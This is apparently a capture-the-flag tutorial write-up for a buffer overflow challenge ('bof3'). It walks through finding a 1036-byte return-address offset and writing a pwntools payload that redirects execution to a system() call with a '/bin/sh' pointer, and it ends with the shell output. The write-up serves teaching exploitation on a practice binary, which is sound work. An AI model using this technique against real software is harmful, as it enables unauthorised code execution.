# bof3

This challenge is similar to bof2, but there are some minor changes:
```C
void func(void)
{
  char overflowme[1024];

  printf("\noverflow me to get /bin/sh");
  printf("\nIF YOU CAN... MUHAHAHAH: ");

  gets(overflowme);     // smash me!

  if(key == 0xcafebabe){
    system("/bin/echo LOL Nice Try!!!");
  }
  else{
    printf("Nah..\n");
  }
}
```

1. The size of the buffer has gotten bigger (1024 bytes instead of 32)
2. There is no direct `system("/bin/sh");` call in the code.

The previous challenge showed how parameters are passed to a function, so the steps necessary to solve this are:
1) Locate the offset of the return pointer
2) Find _where_ to redirect code execution
3) Find a usable pointer to the string `"/bin/sh"`
4) Ensure the stack is set up correctly to pass the pointer to `"/bin/sh"` to `system()`

## 1) Locate the offset of the return pointer
This part has been covered in the previous two challenges, so this will be an abbreviated version.
* [step1.py -d](./step1.py) Crash:
```asm
 [----------------------------------registers-----------------------------------]
EAX: 0x6 
EBX: 0x0 
ECX: 0xffffffff 
EDX: 0xf7745870 --> 0x0 
ESI: 0xf7744000 --> 0x1b1db0 
EDI: 0xf7744000 --> 0x1b1db0 
EBP: 0x6b616169 ('iaak')
ESP: 0xffc7cee0 ("kaaklaakma")
EIP: 0x6b61616a ('jaak')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x6b61616a
[------------------------------------stack-------------------------------------]
0000| 0xffc7cee0 ("kaaklaakma")
0004| 0xffc7cee4 ("laakma")
0008| 0xffc7cee8 --> 0x616d ('ma')
0012| 0xffc7ceec --> 0xf75aa637 (<__libc_start_main+247>:       add    esp,0x10)
0016| 0xffc7cef0 --> 0xf7744000 --> 0x1b1db0 
0020| 0xffc7cef4 --> 0xf7744000 --> 0x1b1db0 
0024| 0xffc7cef8 --> 0x0 
0028| 0xffc7cefc --> 0xf75aa637 (<__libc_start_main+247>:       add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
gdb-peda$ 
```
Then find offset:
```bash
code@hackbox2:~/code/how2bof/bof3$ pwn cyclic -l 'jaak'
1036
```
## 2) Find _where_ to redirect code execution
We have covered this in bof2, so another abbreviated version:
```asm
gdb-peda$ disassemble func
Dump of assembler code for function func:
=> 0x0804851b <+0>:     push   ebp
   0x0804851c <+1>:     mov    ebp,esp
   0x0804851e <+3>:     sub    esp,0x408
   0x08048524 <+9>:     sub    esp,0xc
   0x08048527 <+12>:    push   0x8048650
   0x0804852c <+17>:    call   0x80483b0 <printf@plt>
   0x08048531 <+22>:    add    esp,0x10
   0x08048534 <+25>:    sub    esp,0xc
   0x08048537 <+28>:    push   0x804866c
   0x0804853c <+33>:    call   0x80483b0 <printf@plt>
   0x08048541 <+38>:    add    esp,0x10
   0x08048544 <+41>:    sub    esp,0xc
   0x08048547 <+44>:    lea    eax,[ebp-0x408]
   0x0804854d <+50>:    push   eax
   0x0804854e <+51>:    call   0x80483c0 <gets@plt>
   0x08048553 <+56>:    add    esp,0x10
   0x08048556 <+59>:    mov    eax,ds:0x804a02c
   0x0804855b <+64>:    cmp    eax,0xcafebabe
   0x08048560 <+69>:    jne    0x8048574 <func+89>
   0x08048562 <+71>:    sub    esp,0xc
   0x08048565 <+74>:    push   0x8048687
   0x0804856a <+79>:    call   0x80483e0 <system@plt>
   0x0804856f <+84>:    add    esp,0x10
   0x08048572 <+87>:    jmp    0x8048584 <func+105>
   0x08048574 <+89>:    sub    esp,0xc
   0x08048577 <+92>:    push   0x80486a1
   0x0804857c <+97>:    call   0x80483d0 <puts@plt>
   0x08048581 <+102>:   add    esp,0x10
   0x08048584 <+105>:   nop
   0x08048585 <+106>:   leave  
   0x08048586 <+107>:   ret    
End of assembler dump.
gdb-peda$ 
```
Great, we have the instructions:
```asm 
   0x08048565 <+74>:    push   0x8048687
   0x0804856a <+79>:    call   0x80483e0 <system@plt>
```
However, if we look at what is being pushed to the stack to be passed to `system` we see it's not what we want:
```asm
gdb-peda$ telescope 0x8048687
0000| 0x8048687 ("/bin/echo LOL Nice Try!!!")
```
Well that won't do! But we have control over the stack, and we know we'd rather pass '/bin/sh'. But how do we find a pointer to that string?

## 3) Find a usable pointer to the string `"/bin/sh"`
We can use PEDA's `find` command to easily find a string (if there is one)
```asm
gdb-peda$ find /bin/sh
Searching for '/bin/sh' in: None ranges
Found 3 results, display max 3 items:
bof3 : 0x8048664 ("/bin/sh")
bof3 : 0x8049664 ("/bin/sh")
libc : 0xf772982b (das)
```
There we go. `0x8048664` or `0x8049664` should work.

## 4) Ensure the stack is set up correctly to pass the pointer to `"/bin/sh"` to `system()`
Make changes to script:
```python
  wait_for_prompt(r)
  payload  = 'A'*1036
  payload += p32(0x0804856a)  #Return pointer. Point this to 0x0804856a <+79>:    call   0x80483e0 <system@plt>
  payload += p32(0x8048664)   #This will be the pointer passed to system(), make this a pointer to '/bin/sh'
```
$ [step2.py -d](./step2.py) to run it through the debugger and investigate exact behavior.
$ [step2.py](./step2.py) to run and get shell:
```bash
$ ./step2.py 
[+] Starting local process './bof3': pid 27953

overflow me to get /bin/sh
IF YOU CAN... MUHAHAHAH: 
[*] Switching to interactive mode
Nah..
$ cat flag
flag{test_flag_for_chall}
```
